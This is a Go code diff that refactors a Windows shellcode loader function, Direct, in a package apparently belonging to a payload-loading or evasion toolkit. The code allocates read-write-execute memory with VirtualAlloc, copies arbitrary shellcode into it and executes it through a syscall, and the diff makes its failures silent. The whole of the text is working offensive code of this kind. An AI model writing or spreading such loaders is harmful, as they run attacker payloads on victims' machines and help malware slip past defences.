@@ -3,28 +3,30 @@ package loader
 import (
 	"syscall"
 	"unsafe"
-	"variant/log"
-	"variant/wdll"
+	"variant/xwindows"
 
 	"golang.org/x/sys/windows"
 )
 
 func Direct(shellcode []byte) {
-	// 调用 VirtualAlloc 分配内存
-	allocSize := uintptr(len(shellcode))
-	mem, _, _ := wdll.VirtualAlloc().Call(
+	execMem, _ := xwindows.VirtualAlloc(
 		uintptr(0),
-		allocSize,
+		uintptr(len(shellcode)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE)
-	if mem == 0 {
-		log.Fatal("VirtualAlloc failed")
+		windows.PAGE_EXECUTE_READWRITE,
+	)
+	if execMem == 0 {
+		return
 	}
 
-	// 将 shellcode 复制到分配的内存空间
-	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
-	copy(buffer, shellcode)
+	/*
+		buffer := (*[0x1_000_000]byte)(unsafe.Pointer(execMem))[:len(shellcode):len(shellcode)]
+		copy(buffer, shellcode)
+	*/
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(execMem)), len(shellcode)), shellcode)
 
-	// 执行 shellcode
-	syscall.Syscall(mem, 0, 0, 0, 0)
+	_, _, errno := syscall.SyscallN(execMem)
+	if errno != 0 {
+		return
+	}
 }
